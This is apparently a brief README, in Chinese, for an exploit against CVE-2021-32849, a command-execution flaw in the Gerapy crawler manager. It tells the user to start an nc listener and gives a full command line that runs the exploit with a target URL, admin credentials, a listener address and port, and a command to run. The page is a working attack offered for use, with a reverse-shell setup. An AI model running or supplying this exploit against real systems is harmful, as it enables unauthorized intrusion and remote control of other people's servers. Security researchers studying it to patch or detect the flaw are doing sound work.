# cve-2021-32849
cve-2021-32849(gerapy命令执行)

# 使用方式
先开启一个nc进行监听，再用exp去打
```
python3 CVE-2021-32849.py -u http://192.168.1.69:8000 -U admin -P admin@123 -r 10.10.16.34 -p 8888 -c id
```
![图片](https://user-images.githubusercontent.com/49674960/165035254-0a9f5f92-101a-476b-ab1d-1ae1024a4eac.png)
